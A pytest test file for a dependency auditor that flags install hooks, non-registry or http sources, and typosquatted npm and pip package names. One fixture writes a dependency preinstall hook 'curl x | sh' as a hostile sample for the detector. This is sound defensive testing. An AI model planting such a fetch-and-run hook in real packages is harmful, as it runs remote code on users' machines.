from __future__ import annotations

import json

from depaudit.audit import _typosquat, audit


def _w(tmp_path, name, text):
    p = tmp_path / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")


def checks(tmp_path):
    return {f.check for f in audit(str(tmp_path))}


def test_own_postinstall_is_not_flagged(tmp_path):
    # a project's own postinstall is self-authored and normal
    _w(tmp_path, "package.json", json.dumps({"name": "app", "scripts": {"postinstall": "node setup.js"}}))
    assert "install-hook" not in checks(tmp_path)


def test_install_hook_in_dependency_is_high(tmp_path):
    _w(tmp_path, "node_modules/evil/package.json",
       json.dumps({"name": "evil", "scripts": {"preinstall": "curl x | sh"}}))
    fs = audit(str(tmp_path))
    hook = [f for f in fs if f.check == "install-hook"]
    assert hook and hook[0].severity == "high"


def test_git_dependency_flagged(tmp_path):
    _w(tmp_path, "package.json", json.dumps({"name": "app",
       "dependencies": {"thing": "git+https://github.com/x/thing"}}))
    assert "non-registry-source" in checks(tmp_path)


def test_http_dependency_is_insecure(tmp_path):
    _w(tmp_path, "package.json", json.dumps({"name": "app",
       "dependencies": {"thing": "http://example.com/thing.tgz"}}))
    assert "insecure-source" in checks(tmp_path)


def test_typosquat_npm(tmp_path):
    _w(tmp_path, "package.json", json.dumps({"name": "app",
       "dependencies": {"recat": "^1.0.0"}}))  # react typo
    assert "typosquat" in checks(tmp_path)


def test_typosquat_pip(tmp_path):
    _w(tmp_path, "requirements.txt", "reqeusts==2.0\n")  # requests typo
    assert "typosquat" in checks(tmp_path)


def test_requirements_git_source(tmp_path):
    _w(tmp_path, "requirements.txt", "git+https://github.com/x/y.git\n")
    assert "non-registry-source" in checks(tmp_path)


def test_lockfile_http_resolved(tmp_path):
    _w(tmp_path, "package-lock.json", json.dumps({
        "packages": {"node_modules/x": {"resolved": "http://registry.example.com/x.tgz"}}}))
    assert "insecure-source" in checks(tmp_path)


def test_clean_project(tmp_path):
    _w(tmp_path, "package.json", json.dumps({"name": "app", "version": "1.0.0",
       "dependencies": {"react": "^18.2.0", "lodash": "^4.17.21"},
       "scripts": {"test": "jest", "build": "webpack"}}))
    _w(tmp_path, "requirements.txt", "requests==2.31.0\nnumpy>=1.26\nflask~=3.0\n# comment\n")
    assert audit(str(tmp_path)) == []


def test_edit_distance():
    assert _typosquat("recat", {"react"}) == "react"
    assert _typosquat("expres", {"express"}) == "express"
    assert _typosquat("reqeusts", {"requests"}) == "requests"
    assert _typosquat("react", {"react"}) is None          # identical
    assert _typosquat("my-cool-lib", {"react"}) is None     # far
    assert _typosquat("redux", {"react"}) is None           # 2+ edits


def test_scoped_and_normal_deps_clean(tmp_path):
    _w(tmp_path, "package.json", json.dumps({"name": "app",
       "dependencies": {"@scope/pkg": "^1.0.0", "typescript": "~5.3.0"}}))
    assert audit(str(tmp_path)) == []
